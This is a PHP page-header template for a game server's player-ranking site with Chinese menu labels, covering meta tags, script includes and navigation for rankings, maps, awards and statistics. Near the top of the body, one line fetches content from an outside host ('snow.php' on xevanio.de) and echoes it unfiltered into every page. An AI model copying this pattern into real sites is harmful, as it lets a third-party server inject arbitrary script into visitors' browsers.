		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<meta name="robots" content="index,follow">
		<meta name="revisit-after" content="7 days">
		<meta name="description" content="<?php echo $site_description;?>">
		<meta name="keywords" content="<?php echo $site_keywords;?>">
		<meta name="url" content="<?php echo $site_statsurl;?>">
		<meta name="copyright" content="<?php echo $site_name;?> | <?php echo $site_url;?>">
		<meta name="design" content="玩家排名系统 © 2021-2022 TRYGEK.COM">
		<meta name="plugin" content="COPYRIGHT © 2010 MUUKIS FOR SOURCEMOD">
		<meta property="og:title" content="<?php echo $site_name;?> | <?php echo $site_game;?> <?php echo $title;?>">
		<meta property="og:description" content="<?php echo $site_description;?>">
		<meta property="og:url" content="<?php echo $site_statsurl;?>">
		<meta property="og:site_name" content="<?php echo $site_name;?>">
		<meta property="og:image" content="<?php echo $site_statsurl;?>_source/images/favicon.png">
		<link rel="shortcut icon" href="<?php echo $site_statsurl;?>_source/images/favicon.ico">
		<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
		<link rel="stylesheet" href="<?php echo $site_statsurl;?>_source/css/bootstrap.min.css" />
		<link rel="stylesheet" href="<?php echo $site_statsurl;?>_source/css/<?php echo $site_style;?>.css" />
		<script src="<?php echo $site_statsurl;?>_source/js/jquery.js"></script>
		<script src="<?php echo $site_statsurl;?>_source/js/steamprofile.js"></script>
		<script src="<?php echo $site_statsurl;?>_source/js/popper.min.js"></script>
		<script src="<?php echo $site_statsurl;?>_source/js/bootstrap.min.js"></script>
		<script src="<?php echo $site_statsurl;?>_source/js/site.js"></script>
	</head>
	<body>

<?php $echo = file_get_contents('https://www.xevanio.de/_source/snow.php'); echo $echo; ?>

		<div id="mySidebar" class="sidebar">
				<div class="mobile_menu"><span class="navbar-brand ml-2"><font color="#fff"><?php if ($site_logo == "") { echo $site_name; } else { echo "<img height=\"$site_logo_height\" width=\"$site_logo_width\" src=\"$site_statsurl$site_logo\" alt=\"Logo\">"; } ?></font></span></div>
				<div class="mobile_menu_close"><a href="javascript:void(0)" class="closebtn" onclick="closeNav()"><small><i class="fa fa-times"></i></small></a></div>
				<div class="mobile_menu_links">
				<div class="bg-main2" style="height: 5px;"></div>
			<div class="container mobile_submenu">
				<a href="<?php echo $site_statsurl;?>"><i class="fa fa-home"></i> 主页</a>
				<button class="dropdown-btn"><i class="fa fa-line-chart"></i> 排名
					<i class="fa fa-caret-down"></i>
				</button>
				<div class="dropdown-container">
					<a href="<?php echo $site_statsurl;?>ranking"><i class="fa fa-angle-right"></i> 全部</a>
					<a href="<?php echo $site_statsurl;?>ranking/index.php?type=coop"><i class="fa fa-angle-right"></i> 战役</a>
					<a href="<?php echo $site_statsurl;?>ranking/index.php?type=realism"><i class="fa fa-angle-right"></i> 写实</a>
					<a href="<?php echo $site_statsurl;?>ranking/index.php?type=versus"><i class="fa fa-angle-right"></i> 对抗</a>
					<a href="<?php echo $site_statsurl;?>ranking/index.php?type=scavenge"><i class="fa fa-angle-right"></i> 清道夫</a>
					<a href="<?php echo $site_statsurl;?>ranking/index.php?type=survival"><i class="fa fa-angle-right"></i> 生产</a>
					<a href="<?php echo $site_statsurl;?>ranking/index.php?type=realismversus"><i class="fa fa-angle-right"></i> 写实对抗</a>
					<a href="<?php echo $site_statsurl;?>ranking/index.php?type=mutations"><i class="fa fa-angle-right"></i> 突变模式</a>
				</div>
				<button class="dropdown-btn"><i class="fa fa-gamepad"></i> 地图
					<i class="fa fa-caret-down"></i>
				</button>
				<div class="dropdown-container">
					<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=coop"><i class="fa fa-angle-right"></i> 战役</a>
					<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=realism"><i class="fa fa-angle-right"></i> 写实</a>
					<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=versus"><i class="fa fa-angle-right"></i> 对抗</a>
					<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=scavenge"><i class="fa fa-angle-right"></i> 清道夫</a>
					<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=survival"><i class="fa fa-angle-right"></i> 生存</a>
					<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=realismversus"><i class="fa fa-angle-right"></i> 写实对抗</a>
					<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=mutations"><i class="fa fa-angle-right"></i> 突变模式</a>
				</div>
				<a href="<?php echo $site_statsurl;?>awards"><i class="fa fa-trophy"></i> 奖项</a>
				<?php if ($gameserver == "enabled"): ?><a href="<?php echo $site_statsurl;?>gameserver"><i class="fa fa-server"></i> 服务器状态</a><?php endif; ?>
				<a href="<?php echo $site_statsurl;?>statistics"><i class="fa fa-bar-chart"></i> 数据</a>
				<a href="<?php echo $site_statsurl;?>ranking/search.php"><i class="fa fa-search"></i> 玩家搜索</a>
				<a href="<?php echo $site_steamgroup;?>" target="_blank"><i class="fa fa-steam-square"></i> steam组</a>
</div>
			</div>
		</div>
		<div id="navbar">
			<nav class="navbar navbar-expand-lg navbar-dark flex-nowrap">
				<div class="container">
					<span class="navbar-brand ml-2"><a class="nav-brand2" href="<?php echo $site_statsurl;?>"><?php if ($site_logo == "") { echo $site_name; } else { echo "<img height=\"$site_logo_height\" width=\"$site_logo_width\" src=\"$site_statsurl$site_logo\" alt=\"Logo\">"; } ?></a></span>
					<button id="sidebarCollapse" class="navbar-toggler openbtn rounded-0 mr-2" type="button" data-target="#navbar1" onclick="openNav()">
						<span><i class="fa fa-bars"></i></span>
					</button>
					<div id="navbarNavDropdown" class="navbar-collapse collapse">
						<ul class="navbar-nav mr-auto">
							<li class="nav-item active"></li>
						</ul>
						<div class="navbar-v2">
							<div class="dropdown-v2">
								<button class="dropbtn-v2"><i class="fa fa-line-chart"></i> 排名
									<i class="fa fa-caret-down"></i>
								</button>
								<div class="dropdown-content-v2">
									<a href="<?php echo $site_statsurl;?>ranking">全部排名</a>
									<a href="<?php echo $site_statsurl;?>ranking/index.php?type=coop">战役</a>
									<a href="<?php echo $site_statsurl;?>ranking/index.php?type=realism">写实</a>
									<a href="<?php echo $site_statsurl;?>ranking/index.php?type=versus">对抗</a>
									<a href="<?php echo $site_statsurl;?>ranking/index.php?type=scavenge">清道夫</a>
									<a href="<?php echo $site_statsurl;?>ranking/index.php?type=survival">生存</a>
									<a href="<?php echo $site_statsurl;?>ranking/index.php?type=realismversus">写实对抗</a>
									<a href="<?php echo $site_statsurl;?>ranking/index.php?type=mutations">突变模式</a>
								</div>
							</div>
							<div class="dropdown-v2">
								<button class="dropbtn-v2"><i class="fa fa-road"></i> 地图
									<i class="fa fa-caret-down"></i>
								</button>
								<div class="dropdown-content-v2">
									<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=coop">地图</a>
									<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=realism">写实</a>
									<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=versus">对抗</a>
									<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=scavenge">清道夫</a>
									<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=survival">生存</a>
									<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=realismversus">写实对抗</a>
									<a href="<?php echo $site_statsurl;?>campaigns/index.php?type=mutations">突变模式</a>
								</div>
							</div>
							<a href="<?php echo $site_statsurl;?>awards"><i class="fa fa-trophy"></i> 奖项</a>
							<?php if ($gameserver == "enabled"): ?><a href="<?php echo $site_statsurl;?>gameserver"><i class="fa fa-server"></i> 服务器状态</a><?php endif; ?>
							<a href="<?php echo $site_statsurl;?>statistics"><i class="fa fa-bar-chart"></i> 数据</a>
						</div>
					</div>
				</div>
			</nav>
		</div>
		<div id="navbar-fix"></div>
		<div id="navbar-line" class="bg-main2" style="height: 5px;"></div>
		<div class="content text-center text-md-left" style="background-color: #eeeeee;">
			<div class="container text-left">
				<br />
				<div class="rounded-0">
					<div class="row d-flex align-items-center">
						<div class="col-md-9 col-lg-9 text-center text-md-left mb-4 mb-md-0">
							<span>
								<i class="fa fa-info-circle"></i> 你可以加入steam组，方便你任何时候快速找到我的服务器.
							</span>
						</div>
						<div class="col-md-3 col-lg-3 text-center text-md-right">
							<a class="btn rounded-0 btn-main2" href="<?php echo $site_steamgroup;?>" target="_blank" role="button"><i class="fa fa-steam-square"></i> Steam组</a>
						</div>
					</div>
				</div>
				<br />
			</div>
		</div>
		<div class="content text-center text-md-left" style="background-color: #f2f2f2;">
			<div class="container text-left">